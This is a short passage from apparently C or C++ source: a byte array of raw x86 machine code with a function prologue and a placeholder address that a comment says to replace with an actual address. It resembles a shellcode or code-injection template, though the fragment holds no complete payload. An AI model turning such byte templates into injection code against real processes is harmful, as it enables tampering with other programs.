        '\x55', '\x8B', '\xEC', '\x83', '\xEC', 
        '\x10', '\x53', '\xC7', '\x45', '\xF0',
        '\xFF', '\xFF', '\xFF', '\xFF',   // replace these 4 bytes
                                          // with actual address
        '\x8B', '\x45', '\xF0', '\x8B', '\x48',
